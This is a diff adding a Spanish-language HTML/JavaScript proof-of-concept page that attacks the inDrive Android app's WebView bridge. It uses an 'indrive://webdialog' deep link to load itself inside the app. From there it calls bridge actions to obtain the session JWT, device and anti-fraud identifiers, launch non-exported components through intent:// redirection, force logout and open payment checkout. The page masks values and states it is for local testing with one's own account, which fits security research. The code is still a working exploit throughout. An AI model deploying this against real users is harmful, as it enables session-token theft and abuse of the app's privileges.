@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>inDrive bridge - fase 1</title>
+<style>
+  :root { color-scheme: dark; }
+  * { box-sizing: border-box; }
+  body { margin:0; padding:14px 14px 40px; font-family: ui-monospace, Menlo, Consolas, monospace; background:#0b0f14; color:#d7e2ea; }
+  h1 { font-size:17px; margin:0 0 6px; color:#fff; }
+  h2 { font-size:13px; text-transform:uppercase; letter-spacing:.08em; color:#7fb3d5; margin:22px 0 8px; }
+  p, li { font-size:12.5px; line-height:1.45; color:#9fb0bd; }
+  code { color:#ffd479; word-break:break-all; }
+  .badge { display:inline-block; padding:3px 8px; border-radius:999px; font-size:11px; font-weight:700; }
+  .ok { background:#123d24; color:#5ee08a; }
+  .bad { background:#3d1212; color:#ff7b7b; }
+  .warn { background:#3d2f12; color:#ffc857; }
+  .card { background:#111821; border:1px solid #1e2a36; border-radius:10px; padding:12px; margin:10px 0; }
+  button { width:100%; padding:13px 12px; margin:6px 0; font-size:14px; font-weight:600; border-radius:9px; border:1px solid #2a3a4a; background:#17222d; color:#e8eef3; }
+  button:active { transform:translateY(1px); }
+  button.safe { border-color:#1f5a37; background:#102a1c; color:#8ff0b0; }
+  button.sens { border-color:#6b4b12; background:#2a2010; color:#ffd479; }
+  button.danger { border-color:#6b1f1f; background:#2a1010; color:#ff9a9a; }
+  input { width:100%; padding:11px; margin:6px 0; border-radius:8px; border:1px solid #2a3a4a; background:#0e151c; color:#e8eef3; font-family:inherit; font-size:13px; }
+  #log { background:#05080b; border:1px solid #1e2a36; border-radius:10px; padding:10px; margin-top:10px; min-height:160px; white-space:pre-wrap; word-break:break-all; font-size:11.5px; line-height:1.4; }
+  .muted { color:#6b7c8a; font-size:11.5px; }
+  .row { display:flex; gap:8px; }
+  .row > * { flex:1; }
+  details { margin:8px 0; }
+  summary { cursor:pointer; font-size:12px; color:#7fb3d5; }
+  #tokenView { display:none; background:#1a0f0f; border:1px dashed #7a3b3b; border-radius:8px; padding:8px; margin:6px 0; font-size:10.5px; word-break:break-all; color:#ffb3b3; }
+  a { color:#7fb3d5; }
+</style>
+</head>
+<body>
+
+<h1>inDrive WebView bridge &mdash; fase 1</h1>
+<p>Banco de pruebas <strong>local</strong> para validar superficie del bridge nativo. No env&iacute;a datos a ning&uacute;n servidor: todo se queda en pantalla. Usar solo con cuenta propia.</p>
+
+<div class="card">
+  <div>Bridge detectado: <span id="stBridge" class="badge bad">no</span></div>
+  <div style="margin-top:6px">WebView URL: <code id="stUrl"></code></div>
+  <div style="margin-top:6px">App: <code id="stApp">-</code> &middot; Modelo: <code id="stModel">-</code> &middot; Android: <code id="stOs">-</code></div>
+</div>
+
+<div class="card" id="outsideOnly">
+  <strong>Fuera del WebView de inDrive</strong>
+  <p>Abre este mismo enlace dentro de la app con el deep link:</p>
+  <p><a id="deeplink" href="#">cargando...</a></p>
+  <button class="safe" onclick="copyDeeplink()">Copiar deep link</button>
+  <p class="muted">Tambi&eacute;n puedes abrir <a href="launcher_phase1.html">launcher_phase1.html</a> desde el tel&eacute;fono.</p>
+</div>
+
+<h2>1. Diagn&oacute;stico (sin efectos)</h2>
+<button class="safe" onclick="probeBridge()">Leer versi&oacute;n / modelo / OS</button>
+<button class="safe" onclick="showBridgeKeys()">Enumerar m&eacute;todos del bridge</button>
+
+<h2>2. Identificadores (solo se muestran enmascarados)</h2>
+<button class="sens" onclick="getHardId()">get_hard_id (Bloomreach ID)</button>
+<button class="sens" onclick="getShieldId()">get_shield_session_id (device ID)</button>
+<button class="sens" onclick="getAcdc()">get_acdc (token antifraude, con gate de host)</button>
+<button class="safe" onclick="getReferral()">get_marketing_referral_link</button>
+
+<h2>3. Token de sesi&oacute;n</h2>
+<button class="danger" onclick="refreshJwt()">refresh_jwt &mdash; comprobar si filtra el access token</button>
+<p class="muted">Solo se muestra si llega, su longitud y un prefijo enmascarado. El valor completo queda oculto salvo que pulses "revelar". No lo compartas ni lo subas al repo.</p>
+<button class="danger" id="revealBtn" style="display:none" onclick="toggleToken()">Revelar token (riesgo)</button>
+<div id="tokenView"></div>
+
+<h2>4. Intent redirection (prueba inofensiva)</h2>
+<button class="safe" onclick="openSettings()">Abrir Ajustes de Android v&iacute;a intent://</button>
+<button class="safe" onclick="openAppDetails()">Abrir detalles de la app inDrive</button>
+<details>
+  <summary>Avanzado: componente interno</summary>
+  <p class="muted">Solo para pruebas propias. El intent se lanza con el UID de inDrive; un componente no exportado del propio app es alcanzable.</p>
+  <input id="component" value="sinet.startup.inDriver/.SplashActivity" spellcheck="false">
+  <button class="sens" onclick="openComponent()">Lanzar componente</button>
+</details>
+
+<h2>5. UI y sesi&oacute;n</h2>
+<button class="safe" onclick="testToast()">Toast nativo (inofensivo)</button>
+<button class="safe" onclick="testShare()">Compartir texto (abre share sheet)</button>
+<button class="sens" onclick="testAnalytics()">Inyectar evento de anal&iacute;tica</button>
+<button class="danger" onclick="testLogout()">Logout forzado con mensaje (te saca de la sesi&oacute;n)</button>
+
+<h2>6. Pago (opcional)</h2>
+<input id="paymentId" placeholder="paymentId propio (no usar ajenos)" spellcheck="false">
+<button class="danger" onclick="requestPayment()">request_payment con ese paymentId</button>
+
+<h2>Log</h2>
+<div id="log">Esperando...</div>
+<div class="row" style="margin-top:8px">
+  <button class="safe" onclick="copyLog()">Copiar log</button>
+  <button class="safe" onclick="downloadLog()">Descargar log</button>
+  <button class="safe" onclick="clearLog()">Limpiar</button>
+</div>
+
+<script>
+var LOG = [];
+var RAW = [];
+var JWT = null;
+var bridge = null;
+
+function now() {
+  var d = new Date();
+  return d.toISOString().slice(11, 23);
+}
+
+function log(msg) {
+  var line = "[" + now() + "] " + msg;
+  LOG.push(line);
+  var el = document.getElementById("log");
+  el.textContent = LOG.join("\n");
+  el.scrollTop = el.scrollHeight;
+}
+
+function mask(value) {
+  var s = String(value == null ? "" : value);
+  if (s.length <= 12) return s;
+  return s.slice(0, 6) + "\u2026" + s.slice(-4) + " (" + s.length + " chars)";
+}
+
+function parsePayload(p) {
+  if (p && typeof p === "object") return p;
+  var s = String(p == null ? "" : p);
+  try { return JSON.parse(s); } catch (e) {}
+  var out = { raw: s };
+  var m;
+  m = /action\s*[:=]\s*"?([A-Za-z0-9_]+)/.exec(s);
+  if (m) out.action = m[1];
+  m = /success\s*[:=]\s*(true|false)/.exec(s);
+  if (m) out.success = (m[1] === "true");
+  m = /hard_id\s*[:=]\s*"?([^",}\s]+)/.exec(s);
+  if (m) out.hard_id = m[1];
+  m = /shield_session_id\s*[:=]\s*"?([^",}\s]+)/.exec(s);
+  if (m) out.shield = m[1];
+  m = /data\s*[:=]\s*"?([^",}\s]+)/.exec(s);
+  if (m) out.data = m[1];
+  m = /acdc\s*[:=]\s*"?([^",}\s]+)/.exec(s);
+  if (m) out.acdc = m[1];
+  m = /referral_link\s*[:=]\s*"?([^",}\s]+)/.exec(s);
+  if (m) out.referral_link = m[1];
+  return out;
+}
+
+window.callWebView = function (payload) {
+  var p = parsePayload(payload);
+  RAW.push(payload);
+  log("<- callWebView: " + (p.action || "?") + " success=" + (p.success !== false) + (p.raw ? " raw=" + p.raw.slice(0, 240) : ""));
+
+  if (p.action === "refresh_jwt") {
+    var tok = null;
+    if (p.payload && p.payload.data) tok = p.payload.data;
+    else if (p.data) tok = p.data;
+    if (tok) {
+      JWT = String(tok);
+      log("TOKEN RECIBIDO: present=true len=" + JWT.length + " prefix=" + mask(JWT));
+      var tv = document.getElementById("tokenView");
+      tv.textContent = JWT;
+      document.getElementById("revealBtn").style.display = "block";
+    } else {
+      log("refresh_jwt sin token (gate de host activo o error)");
+    }
+    return;
+  }
+
+  if (p.action === "get_hard_id") {
+    var hid = (p.payload && (p.payload.hard_id || p.payload.data)) || p.hard_id || p.data;
+    log("HARD_ID: " + (hid ? mask(hid) : "no recibido"));
+    return;
+  }
+
+  if (p.action === "get_shield_session_id") {
+    var sid = (p.payload && (p.payload.data || p.payload.shield_session_id)) || p.data || p.shield;
+    log("SHIELD_SESSION_ID: " + (sid ? mask(sid) : "no recibido"));
+    return;
+  }
+
+  if (p.action === "get_acdc") {
+    var acdc = (p.payload && (p.payload.acdc || p.payload.data)) || p.acdc || p.data;
+    log("ACDC: " + (acdc ? mask(acdc) : "no recibido (host no whitelisteado)"));
+    return;
+  }
+
+  if (p.action === "send_marketing_referral_link") {
+    var ref = (p.payload && p.payload.referral_link) || p.referral_link;
+    log("REFERRAL_LINK: " + (ref ? ref : "no recibido"));
+    return;
+  }
+
+  if (p.payload) log("payload: " + JSON.stringify(p.payload).slice(0, 400));
+};
+
+function detectBridge() {
+  bridge = (window.Android && typeof window.Android.postMessage === "function") ? window.Android : null;
+  var badge = document.getElementById("stBridge");
+  var inside = !!bridge;
+  badge.textContent = inside ? "si" : "no";
+  badge.className = "badge " + (inside ? "ok" : "bad");
+  document.getElementById("outsideOnly").style.display = inside ? "none" : "block";
+  document.getElementById("stUrl").textContent = location.href;
+  log("window.Android: " + (inside ? "presente" : "ausente"));
+  log("window.inDrive: " + (window.inDrive ? "presente" : "ausente"));
+  if (!inside) log("Abre este enlace con el deep link para activar el bridge.");
+  return inside;
+}
+
+function send(action, data) {
+  if (!bridge && !detectBridge()) {
+    log("ERROR: bridge no disponible en este contexto.");
+    return;
+  }
+  var msg = JSON.stringify({ action: action, data: data || {} });
+  log("-> " + action + " " + (JSON.stringify(data || {}).slice(0, 200)));
+  try {
+    bridge.postMessage(msg);
+  } catch (e) {
+    log("postMessage error: " + e.message);
+  }
+}
+
+function probeBridge() {
+  if (!bridge && !detectBridge()) return;
+  try {
+    if (bridge.getAppVersion) log("getAppVersion: " + bridge.getAppVersion());
+    if (bridge.getDeviceModel) log("getDeviceModel: " + bridge.getDeviceModel());
+    if (bridge.getOsVersion) log("getOsVersion: " + bridge.getOsVersion());
+    document.getElementById("stApp").textContent = bridge.getAppVersion ? bridge.getAppVersion() : "-";
+    document.getElementById("stModel").textContent = bridge.getDeviceModel ? bridge.getDeviceModel() : "-";
+    document.getElementById("stOs").textContent = bridge.getOsVersion ? bridge.getOsVersion() : "-";
+  } catch (e) {
+    log("probe error: " + e.message);
+  }
+}
+
+function showBridgeKeys() {
+  if (!bridge && !detectBridge()) return;
+  var keys = [];
+  for (var k in bridge) keys.push(k);
+  log("metodos bridge (" + keys.length + "): " + keys.join(", "));
+}
+
+function getHardId() { send("get_hard_id", {}); }
+function getShieldId() { send("get_shield_session_id", {}); }
+function getAcdc() { send("get_acdc", {}); }
+function getReferral() { send("get_marketing_referral_link", {}); }
+
+function refreshJwt() {
+  log("refresh_jwt: solicitando token al bridge...");
+  send("refresh_jwt", {});
+}
+
+function toggleToken() {
+  var tv = document.getElementById("tokenView");
+  var btn = document.getElementById("revealBtn");
+  if (!JWT) return;
+  var shown = tv.style.display === "block";
+  tv.style.display = shown ? "none" : "block";
+  btn.textContent = shown ? "Revelar token (riesgo)" : "Ocultar token";
+  if (!shown) log("token revelado en pantalla; no tomar captura con el valor visible");
+}
+
+function openSettings() {
+  var u = "intent://settings#Intent;action=android.settings.SETTINGS;end";
+  send("open_browser_tab", { url: u });
+}
+
+function openAppDetails() {
+  var u = "intent://details#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;S.android.provider.extra.PACKAGE_NAME=sinet.startup.inDriver;end";
+  send("open_browser_tab", { url: u });
+}
+
+function openComponent() {
+  var c = document.getElementById("component").value.trim();
+  if (!c) return;
+  if (!confirm("Lanzar el componente interno " + c + " con el UID de inDrive?")) return;
+  var u = "intent://launch#Intent;component=" + c + ";end";
+  send("open_browser_tab", { url: u });
+}
+
+function testToast() {
+  send("toast", { text: "PoC fase 1 - " + new Date().toISOString() });
+}
+
+function testShare() {
+  send("share", { text: "inDrive bridge PoC" });
+}
+
+function testAnalytics() {
+  send("webview_send_analytics", { event: "poc_phase1_marker", value: 1 });
+}
+
+function testLogout() {
+  if (!confirm("Esto cierra tu sesion actual de inDrive. Continuar?")) return;
+  send("logout_with_message", { message: "PoC fase 1 - cierre de sesion de prueba" });
+}
+
+function requestPayment() {
+  var id = document.getElementById("paymentId").value.trim();
+  if (!id) { log("request_payment: escribe un paymentId propio primero"); return; }
+  if (!confirm("Abrir el checkout interno con paymentId=" + id + "?")) return;
+  send("request_payment", { paymentId: id });
+}
+
+function deeplink() {
+  return "indrive://webdialog?url=" + encodeURIComponent(location.href);
+}
+
+function copyDeeplink() {
+  var url = deeplink();
+  copyText(url).then(function () { log("deep link copiado: " + url); });
+}
+
+function copyText(t) {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    return navigator.clipboard.writeText(t).catch(function () { copyFallback(t); });
+  }
+  copyFallback(t);
+  return Promise.resolve();
+}
+
+function copyFallback(t) {
+  var ta = document.createElement("textarea");
+  ta.value = t;
+  document.body.appendChild(ta);
+  ta.select();
+  try { document.execCommand("copy"); } catch (e) {}
+  document.body.removeChild(ta);
+}
+
+function copyLog() { copyText(LOG.join("\n")).then(function () { log("log copiado"); }); }
+
+function downloadLog() {
+  var blob = new Blob([LOG.join("\n")], { type: "text/plain" });
+  var a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "indrive-phase1-log.txt";
+  a.click();
+}
+
+function clearLog() {
+  LOG = [];
+  document.getElementById("log").textContent = "Esperando...";
+}
+
+(function init() {
+  document.getElementById("deeplink").textContent = deeplink();
+  document.getElementById("deeplink").href = deeplink();
+  detectBridge();
+  probeBridge();
+  log("listo. host=" + location.host);
+})();
+</script>
+</body>
+</html>
